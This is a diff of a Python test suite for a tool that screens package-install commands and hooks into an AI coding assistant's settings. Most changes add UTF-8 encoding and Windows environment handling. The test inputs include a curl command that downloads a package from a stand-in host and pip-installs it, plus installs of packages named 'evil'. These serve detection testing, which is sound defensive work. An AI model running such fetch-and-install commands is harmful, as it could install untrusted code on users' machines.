@@ -219,7 +219,7 @@ def test_local_file_that_is_not_there_is_asked_about(tmp_path):
     assert parse("npm install ./evil.tgz")[1] == ["local_missing"]
     # downloaded by the same command: what is on disk now is not what gets installed
     assert parse("curl -o evil.whl https://x/evil.whl && pip install evil.whl")[1] == ["file_changed"]
-    (tmp_path / "real.whl").write_text("x")
+    (tmp_path / "real.whl").write_text("x", encoding="utf-8")
     packages, unverifiable, notes = parse("pip install real.whl", cwd=str(tmp_path),
                                           exists=os.path.exists)
     assert unverifiable == [] and len(notes) == 1
@@ -345,7 +345,7 @@ def test_reinstall_replaces_the_old_bash_only_entry(home):
     settings = home / ".claude" / "settings.json"
     settings.parent.mkdir()
     settings.write_text(json.dumps({"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [
-        {"type": "command", "command": ch.hook_command(), "timeout": 30}]}]}}))
+        {"type": "command", "command": ch.hook_command(), "timeout": 30}]}]}}), encoding="utf-8")
     ch.install()
     groups = json.loads(settings.read_text(encoding="utf-8"))["hooks"]["PreToolUse"]
     assert len(groups) == 1 and "Write" in groups[0]["matcher"]
@@ -354,7 +354,7 @@ def test_reinstall_replaces_the_old_bash_only_entry(home):
 # override + blocklist
 def _overrides(home, **data):
     (home / ".stillrunning").mkdir(exist_ok=True)
-    (home / ".stillrunning" / "overrides.json").write_text(json.dumps(data))
+    (home / ".stillrunning" / "overrides.json").write_text(json.dumps(data), encoding="utf-8")
 
 
 def test_override_does_not_silently_allow_a_blocklisted_package(home, monkeypatch):
@@ -490,9 +490,9 @@ def test_npm_wrapper_checks_update_and_link(tmp_path):
 def test_python_m_pip_behind_interpreter_flags_reaches_the_wrapper(tmp_path):
     binp = tmp_path / ".stillrunning" / "bin"
     binp.mkdir(parents=True)
-    (binp / "pip").write_text('#!/bin/bash\necho "WRAPPED $@"\n')
+    (binp / "pip").write_text('#!/bin/bash\necho "WRAPPED $@"\n', encoding="utf-8")
     (binp / "pip").chmod(0o755)
     script = cli._ACTIVATE_SCRIPT + '\npython3 -W ignore -m pip install evil\npython3 -X dev -u -m pip install x\n'
     r = subprocess.run(["/bin/bash", "-c", script], capture_output=True, text=True, timeout=20,
-                       env={"HOME": str(tmp_path), "PATH": os.environ["PATH"]}, stdin=subprocess.DEVNULL)
+                       env={"HOME": str(tmp_path), **({"USERPROFILE": str(tmp_path), "SYSTEMROOT": os.environ.get("SYSTEMROOT", "")} if os.name == "nt" else {}), "PATH": os.environ["PATH"]}, stdin=subprocess.DEVNULL)
     assert r.stdout.splitlines() == ["WRAPPED install evil", "WRAPPED install x"], r.stderr
